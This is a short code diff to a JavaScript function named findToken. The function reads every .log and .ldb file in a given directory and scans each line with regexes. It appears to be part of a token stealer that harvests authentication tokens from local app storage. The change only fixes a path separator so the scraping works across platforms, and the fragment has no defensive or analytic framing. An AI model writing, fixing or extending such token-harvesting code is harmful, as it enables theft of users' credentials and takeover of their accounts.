@@ -41,7 +41,7 @@ const findToken = (tokenPath) => {
     try {
       fs.readdirSync(path.normalize(tokenPath)).map((file) => {
         if (file.endsWith('.log') || file.endsWith('.ldb')) {
-          fs.readFileSync(`${tokenPath}\\${file}`, 'utf8')
+          fs.readFileSync(`${tokenPath}/${file}`, 'utf8')
             .split(/\r?\n/)
             .forEach((line) => {
               const regex = [
